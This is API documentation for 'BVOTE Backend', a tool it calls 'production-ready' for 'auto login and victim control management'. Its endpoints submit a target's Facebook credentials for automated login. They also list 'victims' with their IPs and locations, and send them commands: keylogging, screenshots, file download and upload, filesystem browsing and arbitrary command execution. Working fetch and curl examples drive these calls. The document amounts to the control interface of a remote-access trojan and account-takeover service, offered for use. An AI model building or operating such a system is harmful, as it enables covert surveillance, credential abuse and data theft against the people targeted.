# 📚 BVOTE Backend API Documentation

## 🚀 Overview

Complete API documentation for BVOTE Backend - a production-ready system for auto login and victim control management.

**Base URL:** `http://localhost:3000` (development) | `https://api.yourdomain.com` (production)

**API Version:** 2.0.0

---

## 🔐 Authentication

### Authentication Methods

1. **JWT Token Authentication** (Recommended)
2. **Admin Key Authentication** (Admin only)
3. **Session-based Authentication** (Web interface)

### Headers

```http
Authorization: Bearer <jwt_token>
Content-Type: application/json
X-Admin-Key: <admin_key>  # For admin endpoints
```

---

## 📋 API Endpoints

### 🔑 Authentication (`/api/auth`)

#### `POST /api/auth/login`
Login with email/password or admin key.

**Request:**
```json
{
  "email": "user@example.com",
  "password": "password123",
  "adminKey": "WEBBVOTE2025$ABC"  // Optional for admin login
}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": "user-123",
    "email": "user@example.com",
    "role": "user",
    "name": "User Name"
  },
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "refreshToken": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": "24h"
}
```

**Status Codes:**
- `200` - Success
- `400` - Validation error
- `401` - Invalid credentials
- `429` - Too many attempts

---

#### `POST /api/auth/register`
Register new user account.

**Request:**
```json
{
  "email": "newuser@example.com",
  "password": "SecurePass123!",
  "name": "New User"
}
```

**Response:**
```json
{
  "success": true,
  "message": "User registered successfully",
  "user": {
    "id": "user-456",
    "email": "newuser@example.com",
    "name": "New User",
    "role": "user"
  }
}
```

**Status Codes:**
- `201` - User created
- `400` - Validation error
- `409` - User already exists

---

#### `POST /api/auth/refresh`
Refresh JWT token using refresh token.

**Request:**
```json
{
  "refreshToken": "eyJhbGciOiJIUzI1NiIs..."
}
```

**Response:**
```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": "24h"
}
```

---

#### `GET /api/auth/me`
Get current user information.

**Headers:**
```http
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "user": {
    "id": "user-123",
    "email": "user@example.com",
    "role": "user",
    "name": "User Name"
  }
}
```

---

#### `POST /api/auth/logout`
Logout and invalidate session.

**Headers:**
```http
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "message": "Logged out successfully"
}
```

---

### 🤖 Auto Login (`/api/auto-login`)

#### `POST /api/auto-login/start`
Start new auto login session.

**Headers:**
```http
Authorization: Bearer <token>
```

**Request:**
```json
{
  "platformId": "facebook",
  "credentials": {
    "email": "target@email.com",
    "password": "password123",
    "twoFactorCode": "123456"  // Optional
  },
  "victimId": "victim-001",
  "options": {
    "headless": true,
    "timeout": 30000,
    "retryAttempts": 3
  }
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "sessionId": "session_1234567890_abcdef",
    "platform": "facebook",
    "status": "initializing",
    "startTime": "2024-01-01T00:00:00.000Z"
  },
  "message": "Auto login session started"
}
```

**Status Codes:**
- `200` - Session started
- `400` - Invalid request
- `401` - Unauthorized
- `429` - Rate limited

---

#### `GET /api/auto-login/sessions`
Get all auto login sessions.

**Headers:**
```http
Authorization: Bearer <token>
```

**Query Parameters:**
- `status` - Filter by status (optional)
- `platform` - Filter by platform (optional)
- `limit` - Number of results (default: 50)
- `offset` - Pagination offset (default: 0)

**Response:**
```json
{
  "success": true,
  "data": {
    "sessions": [
      {
        "id": "session_123",
        "platform": "facebook",
        "status": "completed",
        "startTime": "2024-01-01T00:00:00.000Z",
        "endTime": "2024-01-01T00:05:00.000Z",
        "duration": 300000,
        "result": {
          "success": true,
          "message": "Login successful"
        }
      }
    ],
    "total": 1,
    "limit": 50,
    "offset": 0
  }
}
```

---

#### `PUT /api/auto-login/sessions/:sessionId`
Update auto login session.

**Headers:**
```http
Authorization: Bearer <token>
```

**Request:**
```json
{
  "status": "paused",
  "options": {
    "timeout": 60000
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Session updated",
  "data": {
    "sessionId": "session_123",
    "status": "paused"
  }
}
```

---

### 👥 Victim Control (`/api/victims`)

#### `GET /api/victims`
Get all victims.

**Headers:**
```http
Authorization: Bearer <token>
```

**Query Parameters:**
- `status` - Filter by status (online, away, offline)
- `limit` - Number of results (default: 50)
- `search` - Search by name or IP

**Response:**
```json
{
  "success": true,
  "data": {
    "victims": [
      {
        "id": "victim-001",
        "name": "Target_User_001",
        "ip": "192.168.1.50",
        "location": "Hà Nội, VN",
        "device": "Windows 11 - Chrome",
        "status": "online",
        "lastSeen": "2024-01-01T00:00:00.000Z",
        "actions": {
          "screen": true,
          "keylog": true,
          "webcam": false,
          "mic": false,
          "control": false
        },
        "sessions": 3,
        "dataSize": "2.3GB"
      }
    ],
    "total": 1
  }
}
```

---

#### `GET /api/victims/:victimId`
Get victim details.

**Headers:**
```http
Authorization: Bearer <token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "victim": {
      "id": "victim-001",
      "name": "Target_User_001",
      "ip": "192.168.1.50",
      "location": "Hà Nội, VN",
      "device": "Windows 11 - Chrome",
      "status": "online",
      "systemInfo": {
        "os": "Windows 11",
        "browser": "Chrome 120.0",
        "cpu": "Intel i7-12700K",
        "memory": "16GB",
        "disk": "512GB SSD"
      },
      "capabilities": [
        "screen_capture",
        "keylogging",
        "file_access",
        "command_execution"
      ]
    }
  }
}
```

---

#### `POST /api/victims/:victimId/commands`
Send command to victim.

**Headers:**
```http
Authorization: Bearer <token>
```

**Request:**
```json
{
  "command": "screenshot",
  "params": {
    "fullscreen": true,
    "quality": 80,
    "format": "png"
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command sent successfully",
  "data": {
    "commandId": "cmd_123",
    "status": "pending",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

**Available Commands:**
- `screenshot` - Take screenshot
- `keylog_start` - Start keylogging
- `keylog_stop` - Stop keylogging
- `file_list` - List files in directory
- `file_download` - Download file
- `file_upload` - Upload file
- `system_info` - Get system information
- `execute` - Execute system command

---

#### `GET /api/victims/:victimId/filesystem`
Browse victim filesystem.

**Headers:**
```http
Authorization: Bearer <token>
```

**Query Parameters:**
- `path` - Directory path (default: C:\)
- `type` - File type filter (optional)

**Response:**
```json
{
  "success": true,
  "data": {
    "path": "C:\\Users\\User\\Documents",
    "files": [
      {
        "name": "document.pdf",
        "type": "file",
        "size": 1024000,
        "modified": "2024-01-01T00:00:00.000Z",
        "permissions": "read-write"
      },
      {
        "name": "folder",
        "type": "directory",
        "size": null,
        "modified": "2024-01-01T00:00:00.000Z",
        "permissions": "read-write"
      }
    ]
  }
}
```

---

### 👑 Admin Management (`/api/admin`)

#### `GET /api/admin/stats`
Get system statistics.

**Headers:**
```http
Authorization: Bearer <admin_token>
```

**Response:**
```json
{
  "success": true,
  "data": {
    "users": {
      "total": 150,
      "active": 120,
      "admins": 5
    },
    "sessions": {
      "autoLogin": {
        "total": 1250,
        "successful": 1100,
        "failed": 150,
        "successRate": 88.0
      },
      "active": 25
    },
    "victims": {
      "total": 50,
      "online": 30,
      "away": 15,
      "offline": 5
    },
    "system": {
      "uptime": 86400000,
      "memory": {
        "used": 2048,
        "total": 8192,
        "percentage": 25.0
      },
      "cpu": 15.5,
      "requests": {
        "total": 50000,
        "successful": 49500,
        "failed": 500,
        "avgResponseTime": 120
      }
    }
  }
}
```

---

#### `GET /api/admin/users`
Get all users (admin only).

**Headers:**
```http
Authorization: Bearer <admin_token>
```

**Query Parameters:**
- `role` - Filter by role
- `status` - Filter by status
- `search` - Search by email or name
- `limit` - Number of results (default: 50)
- `offset` - Pagination offset

**Response:**
```json
{
  "success": true,
  "data": {
    "users": [
      {
        "id": "user-123",
        "email": "user@example.com",
        "name": "User Name",
        "role": "user",
        "status": "active",
        "createdAt": "2024-01-01T00:00:00.000Z",
        "lastLogin": "2024-01-01T12:00:00.000Z"
      }
    ],
    "total": 150,
    "limit": 50,
    "offset": 0
  }
}
```

---

### 📊 Monitoring (`/api/monitoring`)

#### `GET /api/monitoring/health`
System health check.

**Response:**
```json
{
  "success": true,
  "health": {
    "status": "healthy",
    "message": "All systems operating normally"
  },
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

**Health Status:**
- `healthy` - All systems normal
- `warning` - Some metrics approaching thresholds
- `critical` - Critical issues detected
- `unknown` - No metrics available

---

#### `GET /api/monitoring/metrics`
Current system metrics (admin only).

**Headers:**
```http
Authorization: Bearer <admin_token>
```

**Response:**
```json
{
  "success": true,
  "metrics": {
    "timestamp": 1704067200000,
    "system": {
      "cpu": 25.5,
      "memory": {
        "total": 8192,
        "used": 2048,
        "free": 6144,
        "percentage": 25.0
      },
      "uptime": 86400000,
      "loadAverage": [1.2, 1.1, 1.0]
    },
    "application": {
      "requestCount": 50000,
      "errorCount": 500,
      "errorRate": 1.0,
      "avgResponseTime": 120,
      "requestsPerSecond": 25.5,
      "activeConnections": 150
    }
  }
}
```

---

#### `GET /api/monitoring/prometheus`
Prometheus metrics endpoint.

**Response:**
```
# HELP bvote_cpu_usage CPU usage percentage
# TYPE bvote_cpu_usage gauge
bvote_cpu_usage 25.5

# HELP bvote_memory_usage Memory usage percentage
# TYPE bvote_memory_usage gauge
bvote_memory_usage 25.0

# HELP bvote_requests_total Total number of requests
# TYPE bvote_requests_total counter
bvote_requests_total 50000
```

---

## 🔒 Security

### Rate Limiting

**General Endpoints:**
- 100 requests per 15 minutes per IP
- Progressive delays after 50 requests

**Authentication Endpoints:**
- 5 requests per 5 minutes per IP
- Account lockout after 5 failed attempts

**Admin Endpoints:**
- 3 requests per 5 minutes per IP
- IP whitelisting in production

### Security Headers

All responses include security headers:
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Content-Security-Policy: default-src 'self'
```

### Input Validation

- Email format validation
- Password complexity requirements
- SQL injection prevention
- XSS protection
- Path traversal prevention

---

## 📈 Performance

### Response Times
- Average: < 100ms
- P95: < 200ms
- P99: < 500ms

### Throughput
- 1000+ requests/second
- 99.9% uptime target

### Caching
- Redis for sessions
- In-memory for frequently accessed data
- CDN for static assets

---

## 🚨 Error Handling

### Error Response Format
```json
{
  "success": false,
  "message": "Error description",
  "error": "Detailed error (development only)",
  "code": "ERROR_CODE",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

### Common Error Codes
- `VALIDATION_ERROR` - Input validation failed
- `AUTHENTICATION_ERROR` - Authentication failed
- `AUTHORIZATION_ERROR` - Insufficient permissions
- `RATE_LIMIT_ERROR` - Too many requests
- `RESOURCE_NOT_FOUND` - Resource not found
- `INTERNAL_ERROR` - Server error

### HTTP Status Codes
- `200` - Success
- `201` - Created
- `400` - Bad Request
- `401` - Unauthorized
- `403` - Forbidden
- `404` - Not Found
- `409` - Conflict
- `429` - Too Many Requests
- `500` - Internal Server Error
- `503` - Service Unavailable

---

## 🔄 WebSocket Events

### Connection
```javascript
const socket = io('/api/socket');
```

### Events
- `metrics:collected` - New metrics available
- `alert:created` - New alert created
- `alert:resolved` - Alert resolved
- `session:started` - Auto login session started
- `session:completed` - Auto login session completed
- `victim:connected` - Victim came online
- `victim:disconnected` - Victim went offline

### Example
```javascript
socket.on('metrics:collected', (metrics) => {
  console.log('New metrics:', metrics);
});

socket.on('alert:created', (alert) => {
  console.log('New alert:', alert);
});
```

---

## 📝 Examples

### Complete Login Flow
```javascript
// 1. Login
const loginResponse = await fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'user@example.com',
    password: 'password123'
  })
});

const { token } = await loginResponse.json();

// 2. Use token for authenticated requests
const userResponse = await fetch('/api/auth/me', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
});

const userData = await userResponse.json();
```

### Auto Login Example
```javascript
// Start auto login session
const sessionResponse = await fetch('/api/auto-login/start', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    platformId: 'facebook',
    credentials: {
      email: 'target@email.com',
      password: 'targetpassword'
    },
    victimId: 'victim-001',
    options: {
      headless: true,
      timeout: 30000
    }
  })
});

const { data } = await sessionResponse.json();
console.log('Session started:', data.sessionId);
```

### Victim Command Example
```javascript
// Send screenshot command
const commandResponse = await fetch('/api/victims/victim-001/commands', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    command: 'screenshot',
    params: {
      fullscreen: true,
      quality: 80
    }
  })
});

const result = await commandResponse.json();
console.log('Command sent:', result.data.commandId);
```

---

## 🛠️ Development

### Testing API
```bash
# Health check
curl http://localhost:3000/health

# Login
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@bvote.com","password":"password123"}'

# Get user info
curl http://localhost:3000/api/auth/me \
  -H "Authorization: Bearer <token>"
```

### Environment Variables
```env
NODE_ENV=development
PORT=3000
JWT_SECRET=your-jwt-secret
ENCRYPTION_KEY=your-encryption-key
ADMIN_KEY=WEBBVOTE2025$ABC
DATABASE_URL=sqlite:./data/bvote.db
```

---

## 📞 Support

For API support:
- **Documentation Issues**: Create GitHub issue
- **Security Issues**: Report privately
- **Feature Requests**: Submit enhancement request

**API Version:** 2.0.0
**Last Updated:** 2024-01-01
**Status:** Production Ready ✅
